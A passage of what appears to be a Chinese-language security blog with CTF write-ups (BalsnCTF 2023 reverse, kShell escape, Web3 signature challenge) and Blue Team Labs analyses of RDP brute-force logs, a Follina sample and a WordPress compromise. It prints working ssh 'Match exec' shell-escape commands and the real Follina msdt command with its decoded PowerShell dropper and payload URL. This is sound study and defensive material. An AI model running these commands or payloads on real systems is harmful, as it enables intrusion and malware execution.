0x0D, 0x59, 0x4D, 0x6C, 0x5B, 0x7F, 0x6B, 0x52, 0x02, 0x7F, 0x13, 0x15, 0x48, 0x10, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xC1, 0x6F, 0xF2, 0x86, 0x23, 0x00, 0x00, 0xE1, 0xF5, 0x05, 0x00, 0x00, 0x00, 0x00] pt = [0x42, 0x41, 0x4c, 0x53, 0x4E, 0x7B] for i in range(len(pt)): print(chr(pt[i] ^ ct[i]), end=\u0026#34;\u0026#34;) # $ python exp.py # 141592 Exploit # ct = [0x73, 0x75, 0x7D, 0x66, 0x77, 0x49, 0x5A, 0x60, 0x50, 0x7E, 0x67, 0x08, 0x44, 0x66, 0x40, 0x02, 0x5E, 0x7B, 0x01, 0x7A, 0x66, 0x03, 0x5B, 0x65, 0x03, 0x47, 0x0F, 0x0D, 0x59, 0x4D, 0x6C, 0x5B, 0x7F, 0x6B, 0x52, 0x02, 0x7F, 0x13, 0x15, 0x48, 0x10, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xC1, 0x6F, 0xF2, 0x86, 0x23, 0x00, 0x00, 0xE1, 0xF5, 0x05, 0x00, 0x00, 0x00, 0x00] key = \u0026#34;1415926535897932\u0026#34; pt = \u0026#34;\u0026#34; for i in range(40): pt += chr(ct[i] ^ ord(key[i % 16])) print(pt) Flag: BALSN{lUcK_1s_s0oO0O_1mP0r74nt_iN_c7F!#}\nReference # BalsnCTF Reverse - lucky WP - maple\nmerger2077 # Background # SDK 和 NDK 差別 Android：清晰講解JNI 與 NDK(含實例教學) Android Studio - dumpsys adb shell dumpsys meminfo詳解\nSource code # merger2077 - source code\nRecon # 這一題沒解出來，但賽後有跟asef聊一下看怎麼解，他說這一題難度是中上，算是要對android debugging和unity很熟才會比較有想法，一開始我看到題目敘述提到flag藏在memory中，所以直覺是想說可以直接用adb把memory dump出來，然後再來分析一下整體的資訊，但貌似adb只能dump一些系統性的資訊，例如目前process的使用情況之類的，我還有嘗試把smali decompiler回java(jadx真的很香)，但source code也沒啥東西，嘗試很久也只能放棄 :::spoiler 嘗試過的過程以及一些好想有用的資訊\n$ adb -s emulator-5554 shell ps | findstr balsn USER PID PPID VSZ RSS WCHAN ADDR S NAME u0_a182 6725 354 36079108 205032 0 0 S com.DefaultCompany.balsnctf2023 $ adb -s emulator-5554 shell emu64xa:/ $ su emu64xa:/ # cat /proc/6725/maps | grep balsn ... 764366600000-764366984000 rw-p 00000000 fe:27 106552 /storage/emulated/0/Android/data/com.DefaultCompany.balsnctf2023/files/il2cpp/Metadata/ばかみたい ... emu64xa:/ # exit emu64xa:/ $ exit $ adb -s emulator-5554 pull /storage/emulated/0/Android/data/com.DefaultCompany.balsnctf2023/files/il2cpp/Metadata/ .\\ 看起來ばかみたい就是一個很可疑的東西，搞不好其實沒啥用處 :::\n根據asef的說法，在設計unity遊戲的時候，通常會把一些資訊(metadata)放在記憶體中，不是特有的exploit，是主要的設計機制就是這樣，而且通常還沒加密，因為有一些遊戲的global variable會需要access，理所當然的我們可以直接去記憶體中撈這一些東西leak一些資訊，更多的說明可以看1\nasef:\n可以查il2cpp或是global-metadata.dat這幾個東西，也可以去讀讀il2cpp的source code應該頗有幫助\nReference # Misc # kshell:five: # Background # [小抄] Docker 基本命令\n如果想要reproduce該題目的話，可以直接下(記得先打開docker desktop):\n$ docker run --rm -it $(docker build -q .) /bin/sh docker build -q .是指利用當前目錄的Dockerfile建一個instance，而Dockerfile是based on alpine這個Image，詳細可以看一下這一篇文章2，然後針對alpine linux作一些檔案搬運和權限控管，最後會運行/start.sh這個檔案，BTW，-q參數的意義是會把當前已經build好的instance的ID print出來，剛好可以丟給docker run當作instance id用。 當我們build完之後就要run他，並且可以跟我們進行shell的互動(-it)參數的意義，然後開/bin/sh給我們用 :::danger 不可以使用/bin/bash，因為alpine只有支援sh這個shell，否則會出現一些error，詳細可以看這一篇3 ::: # 成功後的結果如下，接著只要運行/kShell.py就可以像比賽中直接開一個kshell instance一樣了\n$ docker run -it --rm $(docker build -q .) /bin/sh /home/kShell # ls /home/kShell # python3 /kShell.py Welcome to _ ___ _ _ _ | |__/ __|| |_ ___ | || | | / /\\__ \\| \u0026#39; \\ / -_)| || | |_\\_\\|___/|_||_|\\___||_||_| kshell~$ 為甚麼不直接執行kShell-wrapper.py? 一開始的確是想要直接運行kShell-wrapper.py想說可以更模擬比賽的環境與狀況，不過中間遇到太多error導致一直都不順利，我想應該還是跟我的主機環境有關係，所以我就直接用docker開instance，就不要用wrapper開，反正效果差不了多少\nLinux Manual Page\n-E: 後面應該要帶一個log file，它會把stderr送到這個log file，而非印出來 -F: 後面應該要帶一個config file，讓ssh可以吃\nLinux 裡的文件描述符 0，1，2， 2＞\u0026amp;1 究竟是什麽或是[學習筆記] Linux Command 「2\u0026gt;\u0026amp;1」 輕鬆談都講得非常清楚 Source code # kShell - Source Code\nRecon # 這一題也是賽後解，當初看到是shell escape的題目是有想到VimJail或是PicoCTF2023 Special的思路，但是完全沒有進展，無奈之下只能放棄，但放棄之前也有一些資訊:\n他只開放幾個command可以使用，包含 kshell~$ help Available commands: help exit id ping traceroute ssh arp netstat pwd 當有error出現的時候會有Meow! An error occurred!的字樣出現，一開始會以為有甚麼樣的作用，但結果完全沒用，顆顆 基本上這一題也是看itiscaleb才知道怎麼解4 Exploit # 兩種解法都很相似，但我只知道大概，都是利用ssh -F接一個config file，然後用Match exec達到RCE，但Match exec是啥鬼啊，找了很多資料都沒有這東西應該說exec會去執行後面帶的command然後跳出目前的shell，啊Match呢????? :::info 23/10/16更新: Match是ssh config裡面的一個語法，底下也已經有更完整的想法 :::\n解法一 /home/kShell # python3 /kShell.py Welcome to _ ___ _ _ _ | |__/ __|| |_ ___ | || | | / /\\__ \\| \u0026#39; \\ / -_)| || | |_\\_\\|___/|_||_|\\___||_||_| kshell~$ ssh -E \u0026#39;Match exec \u0026#34;sh 0\u0026lt;\u0026amp;2 1\u0026gt;\u0026amp;2\u0026#34; #aaa\u0026#39; x kshell~$ ssh -F \u0026#39;Match exec \u0026#34;sh 0\u0026lt;\u0026amp;2 1\u0026gt;\u0026amp;2\u0026#34; #aaa\u0026#39; -E aaa x kshell~$ ssh -F aaa x /home/kShell # /readflag BALSN{h0w_d1d_u_g3t_RCE_on_my_kSSHell??} # Special thanks to Orange\u0026#39;s oShell challenge! 提供以上解法的是DC裡面的一個@lebrOnli大大 它的意思是先利用ssh -E創造一個log file，名稱叫做Match exec \u0026quot;sh 0\u0026lt;\u0026amp;2 1\u0026gt;\u0026amp;2\u0026quot; #aaa，而後面的x就當作一般連線的host name，但反正一定是錯的 $ ssh -E \u0026#39;Match exec \u0026#34;sh 0\u0026lt;\u0026amp;2 1\u0026gt;\u0026amp;2\u0026#34; #aaa\u0026#39; x $ ll -rwxrwxrwx 1 sbk6401 sbk6401 62 Oct 16 00:01 \u0026#39;Match exec \u0026#34;sh 0\u0026lt;\u0026amp;2 1\u0026gt;\u0026amp;2\u0026#34; #aaa\u0026#39; $ cat Match\\ exec\\ \\\u0026#34;sh\\ 0\\\u0026lt;\\\u0026amp;2\\ 1\\\u0026gt;\\\u0026amp;2\\\u0026#34;\\ \\#aaa ssh: Could not resolve hostname x: Name or service not known 再利用這個log file當作config file丟給ssh -F，當然它會噴錯，因為裡面根本不是一般的config info $ ssh -F \u0026#39;Match exec \u0026#34;sh 0\u0026lt;\u0026amp;2 1\u0026gt;\u0026amp;2\u0026#34; #aaa\u0026#39; -E aaa x $ cat aaa Match exec \u0026#34;sh 0\u0026lt;\u0026amp;2 1\u0026gt;\u0026amp;2\u0026#34; #aaa: line 1: Bad configuration option: ssh: Match exec \u0026#34;sh 0\u0026lt;\u0026amp;2 1\u0026gt;\u0026amp;2\u0026#34; #aaa: terminating, 1 bad configuration options 此時可以看到檔案aaa的內容已經因為log append變成Match exec \u0026ldquo;sh 0\u0026lt;\u0026amp;2 1\u0026gt;\u0026amp;2\u0026rdquo;，而#字號後面就當作一般的comment 此時我們已經構建好config file了，則我們可以把aaa當作conig丟給ssh -F，它就會去執行裡面的內容，而實際上真正讓我們escape是因為exec，它會執行後面的東西完了以後就跳出目前的shell，然後就可以執行/readflag 解法二 kshell~$ ssh localhost -F /proc/self/fd/1 Match exec \u0026#34;/readflag\u0026gt;\u0026amp;2\u0026#34; BALSN{h0w_d1d_u_g3t_RCE_on_my_kSSHell??} # Special thanks to Orange\u0026#39;s oShell challenge! 這個解法更省力，誠如作者所說，如果config file是一個fd呢?它就會直接讓我們輸入東西當成它的configuration，所以只要下跟上面一樣的command就會跳出來，不過@itiscaleb是直接執行然後印出來，不知道這樣的操作為啥會成功，如果是我的話會直接用Match exec \u0026quot;sh 0\u0026lt;\u0026amp;2 1\u0026gt;\u0026amp;2跳出來再執行/readflag Flag: BALSN{h0w_d1d_u_g3t_RCE_on_my_kSSHell??} Reference # Web3:four: # Background # ethereumbook 第五章 密要、地址\n互換客戶端地址協議（ICAP）是一種部分與國際銀行帳號（IBAN）編碼兼容的以太坊地址編碼，為以太坊地址提供多功能，校驗和互操作編碼。ICAP地址可以編碼以太坊地址或通過以太坊名稱註冊表註冊的常用名稱。\n閱讀以太坊Wiki上的ICAP：https://github.com/ethereum/wiki/wiki/ICAP:-Inter-exchange-Client-Address-Protocol\nIBAN是識別銀行帳號的國際標準，主要用於電匯。它在歐洲單一歐元支付區（SEPA）及其以後被廣泛採用。IBAN是一項集中和嚴格監管的服務。ICAP是以太坊地址的分散但兼容的實現。\n一個IBAN由含國家程式碼，校驗和和銀行帳戶識別碼（特定國家）的34個字母數字字符（不區分大小寫）組成。\nICAP使用相同的結構，通過引入代表“Ethereum”的非標準國家程式碼“XE”，後面跟著兩個字符的校驗和以及3個可能的帳戶識別碼變體\nethers.js 工具包 - getaddress\nlet address = \u0026#34;0xd115bffabbdd893a6f7cea402e7338643ced44a6\u0026#34;; let icapAddress = \u0026#34;XE93OF8SR0OWI6F4FO88KWO4UNNGG1FEBHI\u0026#34;; console.log(utils.getAddress(address)); // \u0026#34;0xD115BFFAbbdd893A6f7ceA402e7338643Ced44a6\u0026#34; console.log(utils.getAddress(icapAddress)); // \u0026#34;0xD115BFFAbbdd893A6f7ceA402e7338643Ced44a6\u0026#34; console.log(utils.getAddress(address, true)); // \u0026#34;XE93OF8SR0OWI6F4FO88KWO4UNNGG1FEBHI\u0026#34; console.log(utils.getAddress(icapAddress, true)); // \u0026#34;XE93OF8SR0OWI6F4FO88KWO4UNNGG1FEBHI\u0026#34; Wallet Signer工具包\nethers.js 工具包 - verifyMessage\nlet signature = \u0026#34;0xddd0a7290af9526056b4e35a077b9a11b513aa0028ec6c9880948544508f3c63265e99e47ad31bb2cab9646c504576b3abc6939a1710afc08cbf3034d73214b81c\u0026#34;; let signingAddress = Wallet.verifyMessage(\u0026#39;hello world\u0026#39;, signature); console.log(signingAddress); // \u0026#34;0x14791697260E4c9A71f18484C9f997B308e59325\u0026#34; Source code # :::spoiler server.js\nconst express = require(\u0026#34;express\u0026#34;); const ethers = require(\u0026#34;ethers\u0026#34;); const path = require(\u0026#34;path\u0026#34;); const app = express(); app.use(express.urlencoded()); app.use(express.json()); app.get(\u0026#34;/\u0026#34;, function(_req, res) { res.sendFile(path.join(__dirname + \u0026#34;/server.js\u0026#34;)); }); function isValidData(data) { if (/^0x[0-9a-fA-F]+$/.test(data)) { return true; } return false; } app.post(\u0026#34;/exploit\u0026#34;, async function(req, res) { try { const message = req.body.message; const signature = req.body.signature; if (!isValidData(signature) || isValidData(message)) { res.send(\u0026#34;wrong data\u0026#34;); return; } const signerAddr = ethers.utils.verifyMessage(message, signature); if (signerAddr === ethers.utils.getAddress(message)) { const FLAG = process.env.FLAG || \u0026#34;get flag but something wrong, please contact admin\u0026#34;; res.send(FLAG); return; } } catch (e) { console.error(e); res.send(\u0026#34;error\u0026#34;); return; } res.send(\u0026#34;wrong\u0026#34;); return; }); const port = process.env.PORT || 3000; app.listen(port); console.log(`Server listening on port ${port}`); :::\nRecon # 這一題是賽後解，因為太難了所以沒解出來，不過還是非常有趣的題目\nRecon 仔細觀察soure code會發現，先用post到/exploit的route，然後帶message和signature的data，兩者都會受到檢查，也就是要符合signature=0xabcd\u0026hellip;，而message就是一般的字元，所以看到#30~#31就會知道，這一題難的地方在於要想辦法找到一個message，他簽名後的錢包地址要和message本身一模一樣才會過條件拿到flag，也就是message也要是一個地址才行，但卻不能是0x開頭 根據5和6的範例就會知道乙太錢包的地址有支援ICAP格式，簡單來說就是另外一種表示方式，一般錢包地址的表示都是採用hex的形式表示，但ICAP是以XE字節開頭表示地址，如下範例所示： const ethers = require(\u0026#34;ethers\u0026#34;) const wallet = ethers.Wallet.createRandom() console.log(ethers.utils.getAddress(wallet.address)) console.log(ethers.utils.getIcapAddress(wallet.address)) # 0x7165ac4B3cb187CC37278919254db9e0867F1f26 # XE68D8UVUZEGBBSCAHT3O1HW4VN63MD31GM 所以我們可以想如果直接拿地址的變形，也就是ICAP的地址當作我們的message，則簽名後得到的signAddress也一樣會是原本的錢包地址，而丟到getAddress的message因為本身就是地址，所以return的字串也會是一般以hex表示的錢包地址 原本的想法(一點都不重要) # 直接暴力搜message簽完名後和message一樣 :::spoiler 爛扣\nconst ethers = require(\u0026#34;ethers\u0026#34;); const generateRandomString = (num) =\u0026gt; { let result1= Math.random().toString(36).substring(2,) + Math.random().toString(36).substring(2,) + Math.random().toString(36).substring(2,) + Math.random().toString(36).substring(2,); console.log(result1.substring(0, num)); return result1.substring(0, num); } async function signAndVerify() { let privateKey = \u0026#34;0x3141592653589793238462643383279502884197169399375105820974944592\u0026#34;; let wallet = new ethers.Wallet(privateKey); try{ while(true){ message = generateRandomString(40); const signature = await wallet.signMessage(message); console.log(signature); console.log(ethers.utils.verifyMessage(message, signature)); console.log(\u0026#39;0x\u0026#39; + message); if (ethers.utils.verifyMessage(message, signature) === \u0026#39;0x\u0026#39; + message){ console.log(\u0026#34;Got it\\nThe mssage is: \u0026#34;, message); break; } console.log(\u0026#34;Nothing Yet\u0026#34;); } } catch (error){ console.log(\u0026#34;Errror\u0026#34;); } } signAndVerify(); :::\nExploit # const ethers = require(\u0026#34;ethers\u0026#34;) const wallet = ethers.Wallet.createRandom() console.log(ethers.utils.getAddress(wallet.address)) const icapAddress = ethers.utils.getIcapAddress(wallet.address) console.log(icapAddress) const message = icapAddress const signature = wallet.signMessage(message) console.log(message, signature) $ node exp.js 0x7165ac4B3cb187CC37278919254db9e0867F1f26 XE68D8UVUZEGBBSCAHT3O1HW4VN63MD31GM XE68D8UVUZEGBBSCAHT3O1HW4VN63MD31GM Promise { \u0026#39;0xf624460a7d73a36edbaf09435856181081e64b82ad0098b70600f55a5d0b24344757ac17f7451df142279abeea25af3dae8d128af5ff48ce5226ac7fc2f591aa1b\u0026#39; } $ node server.js # 自己開service $ curl -X POST localhost:3000/exploit --data \u0026#39;message=XE68D8UVUZEGBBSCAHT3O1HW4VN63MD31GM\u0026amp;signature=0xf624460a7d73a36edbaf09435856181081e64b82ad0098b70600f55a5d0b24344757ac17f7451df142279abeea25af3dae8d128af5ff48ce5226ac7fc2f591aa1b\u0026#39; get flag but something wrong, please contact admin% 因為是賽後解，所以就自己開service，但最後的結果確定可以拿到flag\nFlag: BALSN{Inter_Exchange_Client_Address_Protocol}\nReference # Crypto # Prime # Web # 0fa # asef PPT\u0026#160;\u0026#x21a9;\u0026#xfe0e;\nAlpine Linux 挑戰最小 docker image OS\u0026#160;\u0026#x21a9;\u0026#xfe0e;\nDocker報錯OCI runtime exec failed: exec failed: unable to start container process: exec: \u0026ldquo;/bin/bash\u0026quot;解決\u0026#160;\u0026#x21a9;\u0026#xfe0e;\nBalsnCTF 2023 kShell WP\u0026#160;\u0026#x21a9;\u0026#xfe0e;\nBalsnCTF 2023 - Web3 WP - maple\u0026#160;\u0026#x21a9;\u0026#xfe0e;\nethers.js 工具包 - getaddress\u0026#160;\u0026#x21a9;\u0026#xfe0e;\n"},{"id":33,"href":"/security/practice/btlo/incident-response/btlo---bruteforce/","title":"BTLO - Bruteforce","section":"Securities","content":" BTLO - Bruteforce # Challenge: https://blueteamlabs.online/home/challenge/bruteforce-16629bf9a2\n:::spoiler TOC [TOC] :::\nScenario # Can you analyze logs from an attempted RDP bruteforce attack?\nOne of our system administrators identified a large number of Audit Failure events in the Windows Security Event log.\nThere are a number of different ways to approach the analysis of these logs! Consider the suggested tools, but there are many others out there!\n==Q1== # How many Audit Failure events are there? (Format: Count of Events)\nRecon # 直接用timeline explorer下4625的條件\nExploit # :::spoiler Flag Flag: 3103 :::\n==Q2== # What is the username of the local account that is being targeted? (Format: Username)\nRecon # 直接看./BTLO_Bruteforce_Challenge.txt的Account Name，總共有\nadministartor BTLO EC2AMAZ-UUEMPAU$ SYSTEM :::spoiler Flag Flag: administrator :::\n==Q3== # What is the failure reason related to the Audit Failure logs? (Format: String)\nRecon # 直接看./BTLO_Bruteforce_Challenge.txt的Failure Reason Failure Reason:\tUnknown user name or bad password.\n:::spoiler Flag Flag: Unknown user name or bad password. :::\n==Q4== # What is the Windows Event ID associated with these logon failures? (Format: ID)\nRecon # 以為是陷阱題，但還是4625\n:::spoiler Flag Flag: 4625 :::\n==Q5== # What is the source IP conducting this attack? (Format: X.X.X.X)\nRecon # 直接看./BTLO_Bruteforce_Challenge.txt的Source Network Address Source Network Address:\t113.161.192.227\n:::spoiler Flag Flag: 113.161.192.227 :::\n==Q6= # What country is this IP address associated with? (Format: Country)\nRecon # 直接看該IP的訊息，用whois來看相關內容，詳細query result可以看這邊 :::spoiler Flag Flag: Vietnam :::\n==Q7== # What is the range of source ports that were used by the attacker to make these login requests? (LowestPort-HighestPort - Ex: 100-541)\nRecon # 寫個簡單的script\n$ cat BTLO_Bruteforce_Challenge.txt | grep \u0026#34;Source Port:\u0026#34; \u0026gt; Extracted_port.txt f = open(\u0026#39;./Extracted_port.txt\u0026#39;, \u0026#39;r\u0026#39;).read().replace(\u0026#39;\tSource Port:\t\u0026#39;, \u0026#39;\u0026#39;).replace(\u0026#39;-\\n\u0026#39;, \u0026#39;\u0026#39;).split(\u0026#39;\\n\u0026#39;)[:-1] # for i in range(len(f)): # print(f[i]) print(f\u0026#39;Min: {min(f)}, Max: {max(f)}\u0026#39;) :::spoiler Flag Flag: 49162-65534 :::\nReference # "},{"id":34,"href":"/security/practice/btlo/incident-response/btlo---follina/","title":"BTLO - Follina","section":"Securities","content":" BTLO - Follina # Challenge: https://blueteamlabs.online/home/challenge/follina-f1a3452f34\n:::spoiler TOC [TOC] ::: :::danger 因為給予的題目是真實的樣本，所以盡量在乾淨的環境或是reliable的sandbox進行測試 :::\nScenario # On a Friday evening when you were in a mood to celebrate your weekend, your team was alerted with a new RCE vulnerability actively being exploited in the wild. You have been tasked with analyzing and researching the sample to collect information for the weekend team.\nTools # VirusTotal Any.Run OSINT\n==Q1== # What is the SHA1 hash value of the sample? (Format: SHA1Hash)\nRecon # 直覺會是先丟到virustotal看hash value，或是直接用sha1sum command也可以\nExploit # $ sha1sum ./sample.doc 06727ffda60359236a8029e0b3e8a0fd11c23313 ./sample.doc :::spoiler Flag Flag: 06727ffda60359236a8029e0b3e8a0fd11c23313 :::\n==Q2== # According to VirusTotal, what is the full filetype of the provided sample? (Format: X X X X)\nRecon # 其實大部分的資訊都可以在virustotal上找到，包含cve, hash value, c2 ip(domain), attacked file\u0026hellip;.，所以呈上題，他就顯示在一開始的details分頁\nExploit # :::spoiler Flag Flag: office open xml document :::\n==Q3== # Extract the URL that is used within the sample and submit it (Format: https://x.domain.tld/path/to/something)\nRecon # 呈上題，如果在virustotal找不到相關的連線網站，可以考慮用動態的方式，像是用any.run這樣線上的sandbox就蠻適合的，但是缺點就是要付費，如果是白嫖仔只能用win7的project，經過實際的測試，我自己用win7的project拿到的pcap和一般有付費的win10是有落差的，所以建議這樣的情況還是上網找有沒有公開的project可以參閱，例如我找到到的這一個，紀錄就非常的完整，不只有完整的Mitre手法、錄影的方式呈現而非截圖、和外部連線的flow也非常完整，這些都是非常吸引人的地方\nExploit # 方法一: VirusTotal 方法二: Public Any.Run Task 有了前面的公開project支援，在network flow的地方就可以看到他頻繁的和某一個domain連線，也就是此次的答案 :::spoiler Flag Flag: https://www.xmlformats.com/office/word/2022/wordprocessingDrawing/RDF842l.html :::\n==Q4== # What is the name of the XML file that is storing the extracted URL? (Format: file.name.ext\nRecon # 現在我們知道了他和外部連線的domain，現在要看他在哪一個file出現過，所以就用老方法直接grep search就好\nExploit # $ unzip sample.doc Archive: sample.doc inflating: [Content_Types].xml inflating: docProps/app.xml inflating: docProps/core.xml inflating: word/document.xml inflating: word/fontTable.xml inflating: word/settings.xml inflating: word/styles.xml inflating: word/webSettings.xml inflating: word/theme/theme1.xml inflating: word/_rels/document.xml.rels inflating: _rels/.rels $ grep -r -i \u0026#39;https://www.xmlformats.com/office/word/2022/wordprocessingDrawing/RDF842l.html\u0026#39; * word/_rels/document.xml.rels:\u0026lt;Relationships xmlns=\u0026#34;http://schemas.openxmlformats.org/package/2006/relationships\u0026#34;\u0026gt;\u0026lt;Relationship Id=\u0026#34;rId3\u0026#34; Type=\u0026#34;http://schemas.openxmlformats.org/officeDocument/2006/relationships/webSettings\u0026#34; Target=\u0026#34;webSettings.xml\u0026#34;/\u0026gt;\u0026lt;Relationship Id=\u0026#34;rId2\u0026#34; Type=\u0026#34;http://schemas.openxmlformats.org/officeDocument/2006/relationships/settings\u0026#34; Target=\u0026#34;settings.xml\u0026#34;/\u0026gt;\u0026lt;Relationship Id=\u0026#34;rId1\u0026#34; Type=\u0026#34;http://schemas.openxmlformats.org/officeDocument/2006/relationships/styles\u0026#34; Target=\u0026#34;styles.xml\u0026#34;/\u0026gt;\u0026lt;Relationship Id=\u0026#34;rId996\u0026#34; Type=\u0026#34;http://schemas.openxmlformats.org/officeDocument/2006/relationships/oleObject\u0026#34; Target=\u0026#34;https://www.xmlformats.com/office/word/2022/wordprocessingDrawing/RDF842l.html!\u0026#34; TargetMode=\u0026#34;External\u0026#34;/\u0026gt;\u0026lt;Relationship Id=\u0026#34;rId5\u0026#34; Type=\u0026#34;http://schemas.openxmlformats.org/officeDocument/2006/relationships/theme\u0026#34; Target=\u0026#34;theme/theme1.xml\u0026#34;/\u0026gt;\u0026lt;Relationship Id=\u0026#34;rId4\u0026#34; Type=\u0026#34;http://schemas.openxmlformats.org/officeDocument/2006/relationships/fontTable\u0026#34; Target=\u0026#34;fontTable.xml\u0026#34;/\u0026gt;\u0026lt;/Relationships\u0026gt; :::spoiler Flag Flag: document.xml.rels :::\n==Q5== # The extracted URL accesses a HTML file that triggers the vulnerability to execute a malicious payload. According to the HTML processing functions, any files with fewer than \u0026lt;Number\u0026gt; bytes would not invoke the payload. Submit the \u0026lt;Number\u0026gt; (Format: Number of Bytes)\nRecon # 這一題是看1的說明才知道答案的，首先我並不知道他中間傳輸的command為何，並且根據Fortinet的報告2，可以知道這一個攻擊的具體poc以及mitigation，以下是從any.run project擷取下來的攻擊command，\n\u0026#34;C:\\WINDOWS\\system32\\msdt.exe\u0026#34; ms-msdt:/id PCWDiagnostic /skip force /param \u0026#34;IT_RebrowseForFile=cal?c IT_LaunchMethod=ContextMenu IT_SelectProgram=NotListed IT_BrowseForFile=h$(Invoke-Expression($(Invoke-Expression(\u0026#39;[System.Text.Encoding]\u0026#39;+[char]58+[char]58+\u0026#39;UTF8.GetString([System.Convert]\u0026#39;+[char]58+[char]58+\u0026#39;FromBase64String(\u0026#39;+[char]34+\u0026#39;JGNtZCA9ICJjOlx3aW5kb3dzXHN5c3RlbTMyXGNtZC5leGUiO1N0YXJ0LVByb2Nlc3MgJGNtZCAtd2luZG93c3R5bGUgaGlkZGVuIC1Bcmd1bWVudExpc3QgIi9jIHRhc2traWxsIC9mIC9pbSBtc2R0LmV4ZSI7U3RhcnQtUHJvY2VzcyAkY21kIC13aW5kb3dzdHlsZSBoaWRkZW4gLUFyZ3VtZW50TGlzdCAiL2MgY2QgQzpcdXNlcnNccHVibGljXCYmZm9yIC9yICV0ZW1wJSAlaSBpbiAoMDUtMjAyMi0wNDM4LnJhcikgZG8gY29weSAlaSAxLnJhciAveSYmZmluZHN0ciBUVk5EUmdBQUFBIDEucmFyPjEudCYmY2VydHV0aWwgLWRlY29kZSAxLnQgMS5jICYmZXhwYW5kIDEuYyAtRjoqIC4mJnJnYi5leGUiOw==\u0026#39;+[char]34+\u0026#39;))\u0026#39;))))i/../../../../../../../../../../../../../../Windows/System32/mpsigstub.exe IT_AutoTroubleshoot=ts_AUTO\u0026#34; 根據3的說明，這是使用 ms-msdt 的架構，使用參數 IT_BrowseForFile 呼叫本機套件 PCWDiagnostic，其中包含嵌入在 $() 中的 PowerShell 語法，用base64 decode過後的關鍵payload如下:\n$cmd = \u0026#34;c:\\windows\\system32\\cmd.exe\u0026#34;; Start-Process $cmd -windowstyle hidden -ArgumentList \u0026#34;/c taskkill /f /im msdt.exe\u0026#34;; Start-Process $cmd -windowstyle hidden -ArgumentList \u0026#34;/c cd C:\\users\\public\\\u0026amp;\u0026amp;for /r %temp% %i in (05-2022-0438.rar) do copy %i 1.rar /y\u0026amp;\u0026amp;findstr TVNDRgAAAA 1.rar\u0026gt;1.t\u0026amp;\u0026amp;certutil -decode 1.t 1.c \u0026amp;\u0026amp;expand 1.c -F:* .\u0026amp;\u0026amp;rgb.exe\u0026#34;; 以下是根據3針對每一個步驟做簡短說明:\nStarts hidden windows to: Kill msdt.exe if it is running Loop through files inside a RAR file, looking for a Base64 string for an encoded CAB file Store this Base64 encoded CAB file as 1.t Decode the Base64 encoded CAB file to be saved as 1.c Expand the 1.c CAB file into the current directory, and finally: Execute rgb.exe (presumably compressed inside the 1.c CAB file)\n這是一個很嚴重的風險等級，victim只要點擊相關的檔案，就會觸發一系列攻擊的payload，也可以看4示範如何利用該漏洞pwn下一台主機，讓攻擊者達到RCE的poc影片，影片中提到使用者只要點擊攻擊文件，甚至只是用內建的預覽功能，也可以在沒有點擊的情況下在背後run一系列payload\nExploit # 這一題根據3的說明以及5的實測，會發現只要經過padding使得總字串的長度大於等於4096就不會觸發核心的攻擊payload，原因是 HTML 處理函數的Hardcoded buffer的大小就是4096，所以如果大於這個數量，payload就沒辦法invoke進去\n:::spoiler Flag Flag: 4096 :::\n==Q6== # After execution, the sample will try to kill a process if it is already running. What is the name of this process? (Format: filename.ext)\nRecon # 根據前一題的描述，以及base64 decode過後的結果會發現如果process中有msdt.exe的話就先kill掉\n:::spoiler Flag Flag: msdt.exe :::\n==Q7== # You were asked to write a process-based detection rule using Windows Event ID 4688. What would be the ProcessName and ParentProcessname used in this detection rule? [Hint: OSINT time!] (Format: ProcessName, ParentProcessName)\nRecon # 這個可以直接看any run的process info，從process之間的關係可以知道msdt.exe的parent process是winword.exe，所以要設定條件的話可以從這邊下手 :::spoiler Flag Flag: msdt.exe, WINWORD.EXE :::\n==Q8== # Submit the MITRE technique ID used by the sample for Execution [Hint: Online sandbox platforms can help!] (Format: TXXXX)\nRecon # 這個也是可以直接看any run public task的cve紀錄，裡面會記錄有關mitre針對該攻擊使用的手法，如下圖 有關Execution的手法紀錄的是T1059.003，攻擊者使用windows command shell(CMD)執行一系列的腳本或payload Exploit # :::spoiler Flag Flag: T1059 :::\n==Q9== # Submit the CVE associated with the vulnerability that is being exploited (Format: CVE-XXXX-XXXXX)\nRecon # 這個可以看virustotal的紀錄 :::spoiler Flag Flag: CVE-2022-30190 :::\nReference # Blue Team Labs: Follina\u0026#160;\u0026#x21a9;\u0026#xfe0e;\n起底 CVE-2022-30190：微軟支援診斷工具（MSDT）高風險 RCE 漏洞 “Follina”\u0026#160;\u0026#x21a9;\u0026#xfe0e;\nRapid Response: Microsoft Office RCE - “Follina” MSDT Attack\u0026#160;\u0026#x21a9;\u0026#xfe0e;\u0026#160;\u0026#x21a9;\u0026#xfe0e;\u0026#160;\u0026#x21a9;\u0026#xfe0e;\nMS-MSDT \u0026ldquo;Follina\u0026rdquo; Office click-to-hack.\u0026#160;\u0026#x21a9;\u0026#xfe0e;\nTwitter Experience Result - John Hammond\u0026#160;\u0026#x21a9;\u0026#xfe0e;\n"},{"id":35,"href":"/security/practice/btlo/incident-response/btlo---log-analysis--compromised-wordpress/","title":"BTLO - Log Analysis -Compromised WordPress","section":"Securities","content":" BTLO - Log Analysis -Compromised WordPress # Challenge: https://blueteamlabs.online/home/challenge/log-analysis-compromised-wordpress-ce000f5b59\n:::spoiler TOC [TOC] :::\nScenario # One of our WordPress sites has been compromised but we\u0026rsquo;re currently unsure how. The primary hypothesis is that an installed plugin was vulnerable to a remote code execution vulnerability which gave an attacker access to the underlying operating system of the server.\nTools # Grep Sort Uniq Apache Log Analyzer\n==Q1== # Identify the URI of the admin login panel that the attacker gained access to (include the token)\nRecon # 這個算是有用過wordpress就會知道的事情，預設的admin login的file name通常是wp-login.php，所以可以用這個當作key word\nExploit # $ cat access.log | grep \u0026#34;wp-login.php\u0026#34; | more | grep \u0026#34;token\u0026#34; -n --color=auto 15:172.21.0.1 - - [12/Jan/2021:16:09:43 +0000] \u0026#34;GET /wp-login.php?itsec-hb-token=adminlogin HTTP/1.1\u0026#34; 200 2738 \u0026#34;-\u0026#34; \u0026#34;Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0\u0026#34; 16:172.21.0.1 - - [12/Jan/2021:16:09:43 +0000] \u0026#34;GET /wp-includes/css/buttons.min.css?ver=5.6 HTTP/1.1\u0026#34; 200 1788 \u0026#34;http://172.21.0.3/wp-login.php?itsec-hb-token=adminlogin\u0026#34; 